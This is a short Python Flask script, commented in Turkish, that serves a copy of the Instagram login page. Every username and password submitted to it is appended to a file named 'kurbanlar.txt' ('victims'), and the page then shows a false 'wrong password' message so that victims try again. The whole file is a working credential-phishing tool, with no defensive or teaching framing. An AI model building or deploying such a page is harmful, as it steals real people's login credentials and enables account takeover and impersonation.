from flask import Flask, render_template_string, request

app = Flask(__name__)

# Instagram tasarımı
HTML_TASARIM = '''
<body style="background-color: #fafafa; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; margin: 0; font-family: sans-serif;">
    <div style="background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px 40px; text-align: center; margin-bottom: 10px;">
        <h1 style="font-size: 40px; margin-bottom: 30px; font-family: 'Arial', sans-serif;">Instagram</h1>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required style="width: 100%; padding: 9px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px;">
            <input type="password" name="password" placeholder="Şifre" required style="width: 100%; padding: 9px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px;">
            <button type="submit" style="width: 100%; background: #0095f6; color: white; border: none; padding: 7px; border-radius: 8px; font-weight: 600; cursor: pointer;">Giriş Yap</button>
        </form>
        {% if hata %}<p style="color: #ed4956; font-size: 14px; margin-top: 20px;">Üzgünüz, şifren yanlıştı.</p>{% endif %}
    </div>
</body>
'''

@app.route('/')
def home():
    return render_template_string(HTML_TASARIM)

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username')
    pw = request.form.get('password')
    with open("kurbanlar.txt", "a") as f:
        f.write(f"Kullanici: {user} | Sifre: {pw}\n")
    return render_template_string(HTML_TASARIM, hata=True)

if __name__ == "__main__":
    app.run()
